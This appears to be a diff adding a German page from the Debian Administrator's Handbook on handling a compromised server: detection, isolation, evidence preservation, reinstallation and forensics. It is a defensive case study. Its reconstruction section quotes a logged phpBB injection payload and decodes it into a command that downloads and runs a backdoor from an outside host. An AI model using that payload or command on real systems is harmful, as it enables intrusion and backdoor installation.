@@ -1,0 +1,327 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html
+    xmlns="http://www.w3.org/1999/xhtml"><head><meta
+        http-equiv="Content-Type"
+        content="text/html; charset=UTF-8" /><title
+        xmlns:d="http://docbook.org/ns/docbook">14.6. Umgang mit einem kompromittierten Rechner</title><link
+        rel="stylesheet"
+        type="text/css"
+        href="Common_Content/css/default.css" /><link
+        rel="stylesheet"
+        media="print"
+        href="Common_Content/css/print.css"
+        type="text/css" /><meta
+        xmlns:d="http://docbook.org/ns/docbook"
+        name="generator"
+        content="publican v4.3.1" /><meta
+        xmlns:d="http://docbook.org/ns/docbook"
+        name="package"
+        content="Debian-debian-handbook-8-de-DE-1.0-1" /><meta
+        name="keywords"
+        content="Firewall, Netzfilter, IDS/NIDS" /><link
+        rel="home"
+        href="index.html"
+        title="Das Debian Administrationshandbuch" /><link
+        rel="up"
+        href="security.html"
+        title="Kapitel 14. Sicherheit" /><link
+        rel="prev"
+        href="sect.other-security-considerations.html"
+        title="14.5. Weitere sicherheitsbezogene Überlegungen" /><link
+        rel="next"
+        href="debian-packaging.html"
+        title="Kapitel 15. Ein Debian-Paket erstellen" /><link
+        rel="canonical"
+        href="http://l.github.io/debian-handbook/html/de-DE/sect.dealing-with-compromised-machine.html" /></head><body
+      class="draft "><noscript><iframe
+          src="//www.googletagmanager.com/ns.html?id=GTM-5H35QX"
+          height="0"
+          width="0"
+          style="display:none;visibility:hidden"></iframe></noscript><script
+        type="text/javascript">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&amp;l='+l:'';j.async=true;j.src=
+'//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-5H35QX');</script><div
+        id="banner"><a
+          href="http://debian-handbook.info/get/"><span
+            class="text">Download the ebook</span></a></div><p
+        id="title"><a
+          class="left"
+          href="http://www.debian.org"><img
+            alt="Product Site"
+            src="Common_Content/images//image_left.png" /></a><a
+          class="right"
+          href="http://debian-handbook.info"><img
+            alt="Documentation Site"
+            src="Common_Content/images//image_right.png" /></a></p><ul
+        class="docnav top"><li
+          class="previous"><a
+            accesskey="p"
+            href="sect.other-security-considerations.html"><strong>Zurück</strong></a></li><li
+          class="home">Das Debian Administrationshandbuch</li><li
+          class="next"><a
+            accesskey="n"
+            href="debian-packaging.html"><strong>Weiter</strong></a></li></ul><div
+        class="section"><div
+          class="titlepage"><div><div><h2
+                class="title"><a
+                  id="sect.dealing-with-compromised-machine"></a>14.6. Umgang mit einem kompromittierten Rechner</h2></div></div></div><div
+          class="para">
+			Trotz bester Absichten und aller Sorgfalt bei der Erstellung der Sicherheitsregeln wird ein Administrator eines Tages einer feindlichen Übernahme gegenüberstehen. Dieser Abschnitt stellt einige Leitlinien darüber bereit, wie man im Falle dieser unglücklichen Umstände reagieren sollte.
+		</div><div
+          class="section"><div
+            class="titlepage"><div><div><h3
+                  class="title"><a
+                    id="idm139686906242896"></a>14.6.1. Den Einbruch eines Crackers entdecken und sehen</h3></div></div></div><div
+            class="para">
+				Der erste Schritt einer Reaktion auf einen Einbruch besteht darin, eine derartige Tat überhaupt wahrzunehmen. Dies ist nicht selbstverständlich, vor allem nicht ohne eine angemessene Überwachungsinfrastruktur.
+			</div><div
+            class="para">
+				Einbrüche bleiben häufig unentdeckt, bis sie direkte Folgen für die legitimen Dienste haben, die auf dem Rechner untergebracht sind, wie zum Beispiel, dass Verbindungen langsamer werden, dass einige Benutzer sich nicht anmelden können, oder eine andere Fehlfunktion. Angesichts dieser Probleme muss sich der Administrator den Rechner genau ansehen und sorgfältig alles überprüfen, was nicht normal funktioniert. Dann entdeckt er normalerweise einen ungewöhnlichen Prozess, zum Beispiel einen namens <code
+              class="literal">apache</code> statt des standardmäßigen <code
+              class="literal">/usr/sbin/apache2</code>. Wenn wir diesem Beispiel weiter folgen, so sollte seine Prozesskennung notiert und mit <code
+              class="filename">/proc/<em
+                class="replaceable">pid</em>/exe</code> überprüft werden, um zu sehen, welches Programm diesen Prozess zur Zeit gerade ausführt:
+			</div><pre
+            class="screen">
+<code
+              class="computeroutput"># </code><strong
+              class="userinput"><code>ls -al /proc/3719/exe</code></strong>
+<code
+              class="computeroutput">lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 /proc/3719/exe -&gt; /var/tmp/.bash_httpd/psybnc</code>
+</pre><div
+            class="para">
+				Ein unter <code
+              class="filename">/var/tmp/</code> installiertes Programm, das als Webserver läuft? Kein Zweifel, der Rechner ist kompromittiert.
+			</div><div
+            class="para">
+				Dies ist nur ein Beispiel, aber auch zahlreiche andere Hinweise können den Administrator alarmieren:
+			</div><div
+            xmlns:d="http://docbook.org/ns/docbook"
+            class="itemizedlist"><ul><li
+                class="listitem"><div
+                  class="para">
+						eine Option eines Befehls, die nicht mehr funktioniert; die Version des Programms, in der der Befehl angeblich vorliegt, stimmt nicht mit der Version überein, die laut <code
+                    class="command">dpkg</code> installiert sein sollte;
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						eine Eingabeaufforderung oder ein Begrüßungsbildschirm, die anzeigen, dass die vorherige Verbindung von einem unbekannten Server oder einem anderen Kontinent kam;
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						Fehler, die darauf zurückzuführen sind, dass die Partition <code
+                    class="filename">/tmp/</code> voll ist, wobei sich dann herausstellt, dass sie voller illegaler Filmkopien ist;
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						und so weiter.
+					</div></li></ul></div></div><div
+          class="section"><div
+            class="titlepage"><div><div><h3
+                  class="title"><a
+                    id="idm139686906231200"></a>14.6.2. Den Server vom Netz nehmen</h3></div></div></div><div
+            class="para">
+				Außer in sehr ungewöhnlichen Fällen erfolgt ein Einbruch über das Netzwerk, und der Angreifer benötigt ein funktionierendes Netzwerk, um seine Ziele zu erreichen (auf vertrauliche Daten zuzugreifen, illegale Dateien zu tauschen, seine Identität durch die Verwendung des Rechners als Zwischenstation zu verbergen und so weiter). Dadurch dass der Rechner vom Netz genommen wird, wird es dem Angreifer unmöglich gemacht, diese Ziele zu erreichen, falls ihm dies bisher noch nicht gelungen ist.
+			</div><div
+            class="para">
+				Dies ist nur möglich, wenn der Server physisch zugänglich ist. Falls sich der Server im Datencenter eines Hosting-Anbieters am anderen Ende des Landes befindet, oder falls der Server aus einem anderen Grund nicht zugänglich ist, ist es gewöhnlich ratsam, als erstes einige wichtige Informationen zu sammeln (siehe den folgenden Abschnitt), und dann den Server so weit wie möglich zu isolieren, indem möglichst viele Dienste abgeschaltet werden (normalerweise alles außer <code
+              class="command">sshd</code>). Diese Situation ist dennoch weiterhin gefährlich, da nicht ausgeschlossen werden kann, dass der Angreifer in gleicher Weise wie der Administrator SSH-Zugriff hat; dies macht es schwieriger, den Rechner zu „reinigen“.
+			</div></div><div
+          class="section"><div
+            class="titlepage"><div><div><h3
+                  class="title"><a
+                    id="idm139686906228016"></a>14.6.3. Alles aufbewahren, was als Beweis dienen könnte</h3></div></div></div><div
+            class="para">
+				Um den Angriff verstehen oder um rechtliche Schritte gegen die Angreifer einleiten zu können, ist es erforderlich, Kopien aller wichtigen Elemente zu erstellen; hierzu gehört der Inhalt der Festplatte, eine Liste aller laufenden Prozesse und eine Liste aller offenen Verbindungen. Der Inhalt des RAM könnte auch verwendet werden, er wird in der Praxis aber selten benutzt.
+			</div><div
+            class="para">
+				Im Eifer des Gefechts sind Administratoren häufig versucht, auf dem kompromittierten Rechner zahlreiche Überprüfungen durchzuführen; dies ist jedoch gewöhnlich keine gute Idee. Jeder Befehl kann unterwandert sein und daher Beweisstücke löschen. Die Überprüfungen sollten auf ein Mindestmaß beschränkt werden (<code
+              class="command">netstat -tupan</code> für Netzwerkverbindungen, <code
+              class="command">ps auxf</code> für eine Liste der Prozesse, <code
+              class="command">ls -alR /proc/[0-9]*</code> für einige zusätzliche Informationen über laufende Programme), und jede durchgeführte Überprüfung sollte sorgfältig notiert werden.
+			</div><div
+            class="sidebar"><div
+              class="titlepage"><div><div><p
+                    class="title"><strong><span
+                        class="emphasis"><em>VORSICHT</em></span> Analyse unter Spannung</strong></p></div></div></div><div
+              class="para">
+				Obwohl es verlockend sein mag, das System zu analysieren, während es läuft, sollte dies unterlassen werden, vor allem, wenn der Server physisch nicht erreichbar ist: Sie können einfach den Programmen, die zur Zeit auf dem kompromittierten System installiert sind, nicht trauen. Es ist gut möglich, dass ein unterwanderter <code
+                class="command">ps</code>-Befehl einige Prozesse verbirgt, oder dass ein unterwanderter <code
+                class="command">ls</code>-Befehl Dateien verbirgt; manchmal ist sogar der Kernel kompromittiert!
+			</div><div
+              class="para">
+				Falls eine solche Analyse „unter Spannung“ dennoch notwendig ist, sollte darauf geachtet werden, nur bekanntermaßen einwandfreie Programme zu benutzen. Eine gute Möglichkeit dies zu tun besteht darin, eine Rettungs-CD mit einwandfreien Programmen zu verwenden oder eine schreibgeschützte Netzwerkfreigabe. Jedoch könnten selbst diese Gegenmaßnahmen nicht ausreichend sein, falls der Kernel selbst kompromittiert ist.
+			</div></div><div
+            class="para">
+				Sobald die „dynamischen“ Elemente gespeichert sind, wird im nächsten Schritt ein vollständiges Abbild der Festplatte gespeichert. Die Erstellung eines derartigen Abbildes ist nicht möglich, solange sich das Dateisystem noch verändert. Deshalb muss es schreibgeschützt neu eingehängt werden. Die einfachste Lösung besteht häufig darin, den Server brutal anzuhalten (nachdem der Befehl <code
+              class="command">sync</code> ausgeführt wurde) und dann den Rechner mit einer Rettungs-CD neu zu starten. Jede Partition sollte mit einem Hilfsprogramm wie <code
+              class="command">dd</code> kopiert werden; diese Abbilder können zu einem anderen Server geschickt werden (zum Beispiel mit dem sehr praktischen Hilfsprogramm <code
+              class="command">nc</code>). Eine andere Möglichkeit ist eventuell noch einfacher: nehmen Sie einfach die Festplatte aus dem Rechner und ersetzen Sie sie durch eine neue, die neu formatiert und installiert werden kann.
+			</div></div><div
+          class="section"><div
+            class="titlepage"><div><div><h3
+                  class="title"><a
+                    id="idm139686906218448"></a>14.6.4. Neu installieren</h3></div></div></div><a
+            id="idm139686906217808"
+            class="indexterm"></a><a
+            id="idm139686906217040"
+            class="indexterm"></a><div
+            class="para">
+				Der Server sollte ohne eine vollständige Neuinstallation nicht wieder ans Netz gebracht werden. Falls die Kompromittierung schwerwiegend war (falls administrative Rechte erlangt worden sind), gibt es fast keinen anderen Weg, um sicher zu sein, dass wir von allem, was der Angreifer hinterlassen haben könnte (vor allem <span
+              class="emphasis"><em>Hintertüren</em></span>), befreit sind. Selbstverständlich müssen auch die jüngsten Sicherheitsaktualisierungen angewendet werden, um so die Sicherheitslücke zu schließen, die vom Angreifer benutzt wurde. Idealerweise sollte die Analyse des Angriffs diesen Angriffsvektor aufzeigen, so dass man sicher sein kann, dass man ihn behoben hat; sonst kann man nur hoffen, dass die Sicherheitslücke eine von denen war, die durch die Aktualisierungen beseitigt worden sind.
+			</div><div
+            class="para">
+				Es ist nicht immer einfach, einen entfernten Server neu zu installieren; hierzu kann es erforderlich sein, Unterstützung vom Hosting-Unternehmen zu bekommen, da nicht alle derartigen Unternehmen automatische Reinstallationssysteme anbieten. Es sollte darauf geachtet werden, den Rechner nicht von Sicherheitskopien zu reinstallieren, die nach dem Beginn der Kompromittierung gezogen worden sind. Idealerweise sollten nur Daten wiederhergestellt werden, wohingegen die eigentliche Software von den Installationsmedien neu installiert wird.
+			</div></div><div
+          class="section"><div
+            class="titlepage"><div><div><h3
+                  class="title"><a
+                    id="idm139686906213632"></a>14.6.5. Forensische Analyse</h3></div></div></div><div
+            class="para">
+				Nun, da der Betrieb wiederhergestellt ist, ist es an der Zeit, sich die Abbilder des kompromittierten Systems genauer anzusehen, um den Angriffsvektor zu verstehen. Beim Einhängen dieser Abbilder sollte darauf geachtet werden, dass die Optionen <code
+              class="literal">ro,nodev,noexec,noatime</code> verwendet werden, um zu verhindern, dass der Inhalt verändert wird (einschließlich der Zeitstempel für den Zugriff auf Dateien) oder versehentlich kompromittierte Programme ausgeführt werden.
+			</div><div
+            class="para">
+				Ein Angriffsszenarium zurückzuverfolgen bedeutet gewöhnlich, nach allem Ausschau zu halten, das verändert und ausgeführt wurde:
+			</div><div
+            xmlns:d="http://docbook.org/ns/docbook"
+            class="itemizedlist"><ul><li
+                class="listitem"><div
+                  class="para">
+						<code
+                    class="filename">.bash_history</code>-Dateien stellen häufig eine sehr interessante Lektüre dar;
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						das Gleiche gilt für Dateien, die vor kurzem erstellt, verändert oder angesteuert wurden;
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						der Befehl <code
+                    class="command">strings</code> hilft dabei, vom Angreifer installierte Programme zu identifizieren, indem er Textstrings aus einer Binärdatei extrahiert;
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						die Protokolldateien in <code
+                    class="filename">/var/log/</code> ermöglichen es oft, eine Chronologie der Ereignisse zu rekonstruieren;
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						Spezialprogramme ermöglichen es auch, den Inhalt von Dateien wiederherzustellen, die möglicherweise gelöscht worden sind, einschließlich der Protokolldateien, die Angreifer häufig löschen.
+					</div></li></ul></div><div
+            class="para">
+				Einige dieser Arbeitsgänge können durch spezialisierte Software erleichtert werden. So ist insbesondere <span
+              class="emphasis"><em>The Coroner Toolkit</em></span> (im Paket <span
+              class="pkg pkg">tct</span>) eine Sammlung derartiger Werkzeuge. Es umfasst mehrere Hilfsprogramme; unter ihnen kann <code
+              class="command">grave-robber</code> Daten eines laufenden kompromittierten Systems sammeln, <code
+              class="command">lazarus</code> extrahiert häufig interessante Daten aus nicht zugewiesenen Bereichen einer Platte, und <code
+              class="command">pcat</code> kann den Speicher, der von einem Prozess verwendet wird, kopieren; andere Datengewinnungsprogramme sind ebenfalls enthalten. <a
+              id="idm139686906202144"
+              class="indexterm"></a>
+			</div><div
+            class="para">
+				Das Paket <span
+              class="pkg pkg">sleuthkit</span> stellt einige weitere Hilfsprogramme zur Analyse eines Dateisystems bereit. Ihre Benutzung wird durch die grafische Schnittstelle <span
+              class="emphasis"><em>Autopsy Forensic Browser</em></span> (im Paket <span
+              class="pkg pkg">autopsy</span>) erleichtert. <a
+              id="idm139686906199472"
+              class="indexterm"></a>
+			</div></div><div
+          class="section"><div
+            class="titlepage"><div><div><h3
+                  class="title"><a
+                    id="idm139686906198704"></a>14.6.6. Das Angriffsszenarium wiederherstellen</h3></div></div></div><div
+            class="para">
+				Alle während der Analyse gesammelten Elemente sollten wie die Teile eines Puzzles zueinander passen; die Erstellung der ersten verdächtigen Dateien steht häufig mit Protokollen in Zusammenhang, die den Einbruch bekunden. Ein Beispiel aus dem Alltag sollte deutlicher sein, als langes theoretisches Gerede.
+			</div><div
+            class="para">
+				Das folgende Protokoll ist ein Auzug aus einer Apache <code
+              class="filename">access.log</code>-Datei:
+			</div><pre
+            class="programlisting">
+www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] "GET /phpbb/viewtopic.php?t=10&amp;highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr(108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)%252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1" 200 27969 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
+</pre><div
+            class="para">
+				Dieses Beispiel entspricht einer alten Sicherheitslücke in phpBB. <div
+              class="url">→ <a
+                href="http://secunia.com/advisories/13239/">http://secunia.com/advisories/13239/</a></div> <div
+              class="url">→ <a
+                href="http://www.phpbb.com/phpBB/viewtopic.php?t=240636">http://www.phpbb.com/phpBB/viewtopic.php?t=240636</a></div>
+			</div><div
+            class="para">
+				Das Entschlüsseln dieser langen URL führt zu der Erkenntnis, dass es dem Angreifer gelungen ist, einigen PHP-Code auszuführen, nämlich: <code
+              class="command">system("cd /tmp; wget gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x bd; ./bd &amp;")</code>. In der Tat wurde eine <code
+              class="filename">bd</code>-Datei in <code
+              class="filename">/tmp/</code> gefunden. Wenn man <code
+              class="command">strings /mnt/tmp/bd</code> ausführt, ergibt sich unter anderem der String <code
+              class="literal">PsychoPhobia Backdoor is starting...</code>. Dies sieht wirklich nach einer Hintertür aus.
+			</div><div
+            class="para">
+				Einige Zeit später wurde dieser Zugang dazu benutzt, einen IRC-<span
+              class="emphasis"><em>Bot</em></span> herunterzuladen, zu installieren und auszuführen, der sich mit einem IRC-Untergrundnetzwerk verbunden hat. Der Bot konnte dann über dieses Protokoll gesteuert und angewiesen werden, Dateien zum Tausch herunterzuladen. Dieses Programm hat sogar seine eigene Programmdatei:
+			</div><pre
+            class="programlisting">** 2004-11-29-19:50:15: NOTICE: :GAB!sex@Rizon-2EDFBC28.pool8250.interbusiness.it NOTICE ReV|DivXNeW|504 :DCC Chat (82.50.72.202)
+** 2004-11-29-19:50:15: DCC CHAT attempt authorized from GAB!SEX@RIZON-2EDFBC28.POOL8250.INTERBUSINESS.IT
+** 2004-11-29-19:50:15: DCC CHAT received from GAB, attempting connection to 82.50.72.202:1024
+** 2004-11-29-19:50:15: DCC CHAT connection suceeded, authenticating
+** 2004-11-29-19:50:20: DCC CHAT Correct password
+(...)
+** 2004-11-29-19:50:49: DCC Send Accepted from ReV|DivXNeW|502: In.Ostaggio-iTa.Oper_-DvdScr.avi (713034KB)
+(...)
+** 2004-11-29-20:10:11: DCC Send Accepted from GAB: La_tela_dell_assassino.avi (666615KB)
+(...)
+** 2004-11-29-21:10:36: DCC Upload: Transfer Completed (666615 KB, 1 hr 24 sec, 183.9 KB/sec)
+(...)
+** 2004-11-29-22:18:57: DCC Upload: Transfer Completed (713034 KB, 2 hr 28 min 7 sec, 80.2 KB/sec)
+</pre><div
+            class="para">
+				Diese Spuren zeigen, dass über die IP-Adresse 82.50.72.202 zwei Videodateien auf dem Server gespeichert wurden.
+			</div><div
+            class="para">
+				Gleichzeitig hat der Angreifer einige zusätzliche Dateien heruntergeladen: <code
+              class="filename">/tmp/pt</code> und <code
+              class="filename">/tmp/loginx</code>. Lässt man diese Dateien durch <code
+              class="command">strings</code> laufen, so ergeben sich Strings wie <span
+              class="foreignphrase"><em
+                class="foreignphrase">Shellcode placed at 0x%08lx</em></span> und <span
+              class="foreignphrase"><em
+                class="foreignphrase">Now wait for suid shell...</em></span>. Diese sehen wie Programme aus, die lokale Schwachstellen ausnutzen, um Administratorrechte zu erlangen. Haben sie ihr Ziel erreicht? In diesem Fall vermutlich nicht, da anscheinend keine Datei nach dem ursprünglichen Einbruch verändert worden ist.
+			</div><div
+            class="para">
+				In diesem Beispiel wurde der gesamte Einbruch rekonstruiert, und es kann daraus geschlossen werden, dass der Angreifer in der Lage war, das kompromittierte System etwa drei Tage lang zu nutzen; aber das wichtigste Element der Analyse ist, dass die Schwachstelle identifiziert worden ist, und dass der Administrator sicher sein kann, dass die neue Installation diese Schwachstelle tatsächlich behebt.
+			</div></div></div><ul
+        class="docnav"><li
+          class="previous"><a
+            accesskey="p"
+            href="sect.other-security-considerations.html"><strong>Zurück</strong>14.5. Weitere sicherheitsbezogene Überlegungen</a></li><li
+          class="up"><a
+            accesskey="u"
+            href="#"><strong>Nach oben</strong></a></li><li
+          class="home"><a
+            accesskey="h"
+            href="index.html"><strong>Zum Anfang</strong></a></li><li
+          class="next"><a
+            accesskey="n"
+            href="debian-packaging.html"><strong>Weiter</strong>Kapitel 15. Ein Debian-Paket erstellen</a></li></ul><div
+        id="translated_pages"><ul><li><a
+              href="../ar-MA/sect.dealing-with-compromised-machine.html">ar-MA</a></li><li><a
+              href="../da-DK/sect.dealing-with-compromised-machine.html">da-DK</a></li><li><a
+              href="../de-DE/sect.dealing-with-compromised-machine.html">de-DE</a></li><li><a
+              href="../el-GR/sect.dealing-with-compromised-machine.html">el-GR</a></li><li><a
+              href="../en-US/sect.dealing-with-compromised-machine.html">en-US</a></li><li><a
+              href="../es-ES/sect.dealing-with-compromised-machine.html">es-ES</a></li><li><a
+              href="../fa-IR/sect.dealing-with-compromised-machine.html">fa-IR</a></li><li><a
+              href="../fr-FR/sect.dealing-with-compromised-machine.html">fr-FR</a></li><li><a
+              href="../hr-HR/sect.dealing-with-compromised-machine.html">hr-HR</a></li><li><a
+              href="../id-ID/sect.dealing-with-compromised-machine.html">id-ID</a></li><li><a
+              href="../it-IT/sect.dealing-with-compromised-machine.html">it-IT</a></li><li><a
+              href="../ja-JP/sect.dealing-with-compromised-machine.html">ja-JP</a></li><li><a
+              href="../pl-PL/sect.dealing-with-compromised-machine.html">pl-PL</a></li><li><a
+              href="../pt-BR/sect.dealing-with-compromised-machine.html">pt-BR</a></li><li><a
+              href="../ro-RO/sect.dealing-with-compromised-machine.html">ro-RO</a></li><li><a
+              href="../ru-RU/sect.dealing-with-compromised-machine.html">ru-RU</a></li><li><a
+              href="../tr-TR/sect.dealing-with-compromised-machine.html">tr-TR</a></li><li><a
+              href="../zh-CN/sect.dealing-with-compromised-machine.html">zh-CN</a></li></ul></div></body></html>
